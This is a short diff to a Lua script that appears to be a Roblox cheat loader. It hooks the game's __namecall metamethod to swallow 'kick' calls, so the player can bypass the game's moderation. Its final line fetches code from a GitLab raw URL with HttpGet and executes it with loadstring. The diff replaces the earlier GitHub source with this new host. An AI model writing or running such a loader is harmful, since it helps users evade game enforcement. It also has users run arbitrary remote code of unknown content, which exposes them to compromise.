@@ -10,7 +10,7 @@ OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
     local NameCallMethod = getnamecallmethod()
 
     if tostring(string.lower(NameCallMethod)) == "kick" then
-          error("Bypassed jmes kick")
+          error("Bypassed Kick")
         return nil
     end
     
@@ -18,4 +18,4 @@ OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
 end)
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/jmesfo0/RobloxScripts/main/psx-jmes.lua"))()
+loadstring(game:HttpGet("https://gitlab.com/S4nZz/sanz/-/raw/main/peesex"))()
